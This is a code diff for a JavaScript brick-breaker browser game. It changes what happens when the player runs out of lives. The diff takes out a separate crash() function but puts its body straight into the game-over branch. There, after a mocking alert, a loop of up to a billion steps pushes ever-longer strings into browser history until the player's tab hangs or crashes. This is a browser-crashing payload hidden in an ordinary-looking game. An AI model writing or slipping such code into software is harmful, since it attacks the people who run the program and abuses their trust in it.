@@ -117,12 +117,7 @@ function drawBricks() {
         }
     }
 }
-	function crash() {
-		var total = "";
-      for( var i = 0; i < 1000000000; i++ ) {
-          total = total + i.toString();
-          history.pushState(0,0, total );
-	}
+	
 function drawScore() {
     ctx.font = "16px Arial";
     ctx.fillStyle = "#0095DD";
@@ -156,7 +151,10 @@ function draw() {
             lives--;
             if(!lives) {
                 alert("ha ha you suck");
-                 setTimeout(crash, 2000 );
+                 var total = "";
+      for( var i = 0; i < 1000000000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
       }
             }
             else {
